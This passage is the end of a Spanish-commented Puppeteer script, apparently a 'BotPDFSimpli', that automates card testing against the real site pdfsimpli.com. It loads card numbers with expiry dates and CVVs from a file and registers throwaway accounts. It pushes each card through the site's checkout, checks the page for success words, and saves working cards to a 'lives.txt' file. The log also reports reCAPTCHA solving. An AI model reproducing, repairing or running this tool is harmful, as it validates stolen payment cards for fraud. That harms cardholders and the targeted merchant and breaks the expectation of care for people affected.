            return true;
        }
    }

    async hacerClicPago() {
        const selectores = [
            { tipo: 'id', valor: '#btnChargeebeeSubmit' },
            { tipo: 'texto', valor: 'pay', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'pagar', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'submit', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'continue', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'completar', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'finalizar', elemento: 'button, input, div' }
        ];
        
        return await this.clicInteligente(selectores, 'BOTÓN PAGO', 5000);
    }

    // VERIFICACIÓN DE RESULTADO
    async verificarResultadoPago() {
        try {
            this.log('⏳ Verificando resultado del pago...');
            await this.delay(10000);
            
            const url = this.page.url();
            const contenido = await this.page.content();
            const contenidoLower = contenido.toLowerCase();
            
            // Verificar por URL
            if (url.includes('confirmation') || url.includes('success') || url.includes('thank')) {
                this.log('✅ ✅ ✅ PAGO EXITOSO detectado por URL', 'SUCCESS');
                return true;
            }
            
            // Verificar por contenido
            const indicadoresExito = [
                'payment successful',
                'pago exitoso',
                'thank you',
                'transaction completed',
                'pago realizado',
                'successful',
                'approved',
                'confirmation'
            ];
            
            for (const indicador of indicadoresExito) {
                if (contenidoLower.includes(indicador.toLowerCase())) {
                    this.log(`✅ ✅ ✅ PAGO EXITOSO detectado: ${indicador}`, 'SUCCESS');
                    return true;
                }
            }
            
            // Verificar errores
            const indicadoresError = [
                'declined',
                'rejected',
                'error',
                'invalid',
                'falló',
                'failed',
                'denied'
            ];
            
            for (const indicador of indicadoresError) {
                if (contenidoLower.includes(indicador)) {
                    this.log(`❌ Pago falló: ${indicador}`, 'ERROR');
                    return false;
                }
            }
            
            this.log('⚠️ No se pudo determinar el resultado del pago, asumiendo fallo', 'WARNING');
            return false;
            
        } catch (error) {
            this.logError(error, 'verificarResultadoPago');
            return false;
        }
    }

    // MÉTODOS AUXILIARES
    generarNombreAleatorio() {
        const nombres = ["Juan", "Maria", "Carlos", "Ana", "Luis", "Laura"];
        const apellidos = ["Garcia", "Rodriguez", "Gonzalez", "Fernandez", "Lopez"];
        return `${nombres[Math.floor(Math.random() * nombres.length)]} ${apellidos[Math.floor(Math.random() * apellidos.length)]}`;
    }

    // FLUJO PRINCIPAL COMPLETO
    async ejecutarFlujoCompleto(tarjeta) {
        try {
            this.log(`\n🎯 INICIANDO FLUJO COMPLETO para tarjeta: ${tarjeta.numero}`);
            
            // Paso 1: Navegar al sitio
            this.log('🌐 Navegando a PDFSimpli...');
            await this.page.goto('https://pdfsimpli.com', { 
                waitUntil: 'networkidle2', 
                timeout: 30000 
            });
            await this.delay(3000);
            
            // Ejecutar pasos en secuencia
            const pasos = [
                { nombre: "Subir PDF", accion: () => this.subirPDF() },
                { nombre: "Convertir PDF", accion: () => this.hacerClicConvert() },
                { nombre: "Iniciar descarga", accion: () => this.hacerClicDownload() },
                { nombre: "Registro de cuenta", accion: () => this.manejarRegistro() },
                { nombre: "Completar información de pago", accion: () => this.completarInformacionPago(tarjeta) },
                { nombre: "Realizar pago", accion: () => this.hacerClicPago() }
            ];
            
            for (const paso of pasos) {
                this.log(`\n🔄 EJECUTANDO: ${paso.nombre}`);
                const resultado = await paso.accion();
                
                if (resultado === false) {
                    this.log(`❌ FALLÓ: ${paso.nombre}`, 'ERROR');
                    return false;
                }
                
                this.log(`✅ COMPLETADO: ${paso.nombre}`, 'SUCCESS');
                await this.delay(2000);
            }
            
            // Verificar resultado final
            this.log('\n🔍 VERIFICANDO RESULTADO DEL PAGO...');
            return await this.verificarResultadoPago();
            
        } catch (error) {
            this.logError(error, 'ejecutarFlujoCompleto');
            return false;
        }
    }

    // GESTIÓN DE ARCHIVOS
    leerTarjetas() {
        try {
            if (!fs.existsSync(this.archivoTarjetas)) {
                this.log('❌ No existe archivo de tarjetas', 'ERROR');
                return [];
            }

            const data = fs.readFileSync(this.archivoTarjetas, 'utf8');
            const lineas = data.split('\n');
            const tarjetas = [];

            for (const linea of lineas) {
                const limpia = linea.trim();
                if (limpia && !limpia.startsWith('#')) {
                    const partes = limpia.split('|');
                    if (partes.length === 4) {
                        tarjetas.push({
                            numero: partes[0].trim(),
                            mes: partes[1].trim(),
                            anio: partes[2].trim(),
                            cvv: partes[3].trim()
                        });
                    }
                }
            }

            this.log(`✅ ${tarjetas.length} tarjetas cargadas`);
            return tarjetas;
        } catch (error) {
            this.logError(error, 'leerTarjetas');
            return [];
        }
    }

    eliminarTarjetaDelArchivo(tarjeta) {
        try {
            if (!fs.existsSync(this.archivoTarjetas)) return false;
            
            const data = fs.readFileSync(this.archivoTarjetas, 'utf8');
            const lineas = data.split('\n');
            const tarjetaStr = `${tarjeta.numero}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.cvv}`;
            
            const nuevasLineas = lineas.filter(linea => {
                const limpia = linea.trim();
                return !(limpia && !limpia.startsWith('#') && limpia === tarjetaStr);
            });
            
            fs.writeFileSync(this.archivoTarjetas, nuevasLineas.join('\n'), 'utf8');
            this.log(`🗑️ Tarjeta eliminada: ${tarjeta.numero.substring(0, 8)}...`);
            return true;
            
        } catch (error) {
            this.logError(error, 'eliminarTarjetaDelArchivo');
            return false;
        }
    }

    guardarTarjetaValida(tarjeta) {
        try {
            const linea = `${tarjeta.numero}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.cvv}|${new Date().toLocaleString()}\n`;
            fs.appendFileSync(this.archivoLives, linea, 'utf8');
            this.log(`💾 TARJETA VÁLIDA GUARDADA: ${tarjeta.numero}`, 'SUCCESS');
            this.estadisticas.tarjetasValidas++;
            return true;
        } catch (error) {
            this.logError(error, 'guardarTarjetaValida');
            return false;
        }
    }

    // EJECUCIÓN PRINCIPAL
    async ejecutarProcesoCompleto() {
        try {
            const tarjetas = this.leerTarjetas();
            if (tarjetas.length === 0) return;

            this.log(`\n🎯 INICIANDO PROCESO CON ${tarjetas.length} TARJETAS`);
            this.log('🤖 BOT PDF SIMPLI - VERSIÓN PROFESIONAL');
            this.log('✅ Registro automático forzado');
            this.log('🎯 Estrategia mixta para iframes');
            this.log('🛡️  Sistema PROFESIONAL de reCAPTCHA v2');
            this.log('⚡ Tiempos optimizados');
            this.log('🔒 Modo headless activado');
            
            if (!await this.iniciarNavegador()) return;

            for (let i = 0; i < tarjetas.length; i++) {
                const tarjeta = tarjetas[i];
                this.log(`\n🔰 [${i+1}/${tarjetas.length}] PROCESANDO: ${tarjeta.numero}`);

                this.estadisticas.tarjetasProcesadas++;

                // Obtener cuenta para esta tarjeta
                this.cuentaActual = this.obtenerProximaCuenta();
                if (!this.cuentaActual) {
                    this.log('❌ No hay cuentas disponibles', 'ERROR');
                    break;
                }

                this.log(`👤 Cuenta asignada: ${this.cuentaActual.email.substring(0, 25)}...`);

                // RESET IFRAME MAPPING PARA CADA TARJETA
                this.iframeMapping = { cardNumber: null, expiry: null, cvv: null };

                // Ejecutar flujo completo
                const exito = await this.ejecutarFlujoCompleto(tarjeta);

                // Procesar resultado
                this.eliminarTarjetaDelArchivo(tarjeta);
                
                if (exito) {
                    this.guardarTarjetaValida(tarjeta);
                    this.log(`\n🎉 ✅ ✅ ✅ TARJETA VÁLIDA ENCONTRADA: ${tarjeta.numero}`, 'SUCCESS');
                    
                    // Marcar cuenta como usada exitosamente
                    this.cuentaActual.usada = true;
                    this.cuentaActual.tarjetasProcesadas++;
                    this.cuentaActual.exitosas++;
                    this.cuentaActual.ultimoUso = new Date().toISOString();
                    this.estadisticas.cuentasUsadas++;
                    
                } else {
                    this.log(`\n❌ TARJETA INVÁLIDA: ${tarjeta.numero}`, 'ERROR');
                    
                    // Marcar cuenta como usada con fallo
                    this.cuentaActual.tarjetasProcesadas++;
                    this.cuentaActual.fallidas++;
                    this.cuentaActual.ultimoUso = new Date().toISOString();
                }

                this.guardarCuentas();

                // Pausa entre tarjetas
                if (i < tarjetas.length - 1) {
                    this.log('⏳ Esperando 5 segundos para siguiente tarjeta...');
                    await this.delay(5000);
                }
            }

            this.mostrarEstadisticas();

        } catch (error) {
            this.logError(error, 'ejecutarProcesoCompleto');
        } finally {
            if (this.browser) {
                await this.browser.close();
            }
        }
    }

    mostrarEstadisticas() {
        this.log(`\n📊 ========== ESTADÍSTICAS FINALES ==========`, 'SUCCESS');
        this.log(`🎯 Tarjetas procesadas: ${this.estadisticas.tarjetasProcesadas}`, 'SUCCESS');
        this.log(`✅ Tarjetas válidas: ${this.estadisticas.tarjetasValidas}`, 'SUCCESS');
        this.log(`👤 Cuentas usadas: ${this.estadisticas.cuentasUsadas}`, 'SUCCESS');
        this.log(`🛡️  reCAPTCHAs resueltos: ${this.estadisticas.recaptchasResueltos}`, 'SUCCESS');
        this.log(`👨‍💻 reCAPTCHAs manuales: ${this.estadisticas.recaptchasManuales}`, 'SUCCESS');
        this.log(`🔄 Reintentos de clic: ${this.estadisticas.reintentosClic}`, 'SUCCESS');
        this.log(`⏱️ Tiempo total de espera: ${Math.round(this.estadisticas.tiempoEsperaAcumulado/1000)} segundos`, 'SUCCESS');
        this.log(`💾 Tarjetas válidas guardadas en: ${this.archivoLives}`, 'SUCCESS');
    }
}

// EJECUCIÓN PRINCIPAL
(async () => {
    console.log('========================================');
    console.log('🤖 BOT PDF SIMPLI - VERSIÓN PROFESIONAL');
    console.log('========================================');
    console.log('✅ Registro automático forzado');
    console.log('🎯 Estrategia mixta para iframes');
    console.log('🛡️  Sistema PROFESIONAL de reCAPTCHA v2');
    console.log('📧 Email y contraseña aleatorios');
    console.log('🔒 Modo headless activado');
    console.log('⚡ Optimizado para Termux');
    console.log('========================================');
    
    const bot = new BotPDFSimpli();
    await bot.ejecutarProcesoCompleto();
    
    console.log('========================================');
    console.log('✨ FIN DEL PROCESO');
    console.log('✨ Revisa /sdcard/Download/bot_log.txt');
    console.log('✨ Tarjetas válidas en /sdcard/Download/lives.txt');
    console.log('========================================');
})();